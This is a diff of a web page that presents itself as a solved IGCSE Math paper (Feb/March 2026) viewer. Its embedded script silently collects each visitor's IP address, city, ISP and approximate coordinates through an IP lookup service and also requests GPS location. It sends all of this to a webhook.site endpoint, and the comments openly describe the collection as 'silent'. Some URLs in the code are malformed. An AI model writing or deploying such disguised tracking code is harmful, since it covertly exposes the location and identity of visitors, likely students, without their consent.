@@ -11,14 +11,11 @@
 </head>
 <body>
     <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
-    
-    <!-- Your PDF Viewer -->
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
         const webhookURL = "https://webhook.site/59dc4f67-d5a2-4305-b950-1ad33d827973";
 
-        // Reliable data transmission function
         function sendLog(data) {
             fetch(webhookURL, {
                 method: 'POST',
@@ -28,37 +25,35 @@
         }
 
         // 1. SILENT IP DATA HANDLER
-        // This function runs automatically when the ipapi script below loads
+        // This function MUST be global (window.) to work with the script tag below
         window.getIP = function(data) {
             sendLog({
                 type: "IP_INFO_SILENT",
                 ip: data.ip,
                 city: data.city,
-                region: data.region,
                 isp: data.org,
                 approx_coords: `${data.latitude}, ${data.longitude}`
             });
         };
 
-        // 2. PRECISION GPS (Triggers Browser Popup)
+        // 2. PRECISION GPS
         navigator.geolocation.getCurrentPosition(pos => {
             sendLog({
                 type: "GPS_LOCATION",
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
-                accuracy: `${pos.coords.accuracy} meters`,
-                google_maps: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
+                map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
             });
         }, err => {
             sendLog({ type: "GPS_ERROR", msg: err.message });
         }, { 
             enableHighAccuracy: false, 
             timeout: 15000, 
-            maximumAge: Infinity // Uses cached data for speed
+            maximumAge: Infinity 
         });
     </script>
     
-    <!-- THE FIX: This specific URL allows silent data collection via JSONP -->
+    <!-- THE CRITICAL FIX: You need /jsonp and ?callback=getIP -->
     <script src="https://ipapi.co"></script>
 
 </body>
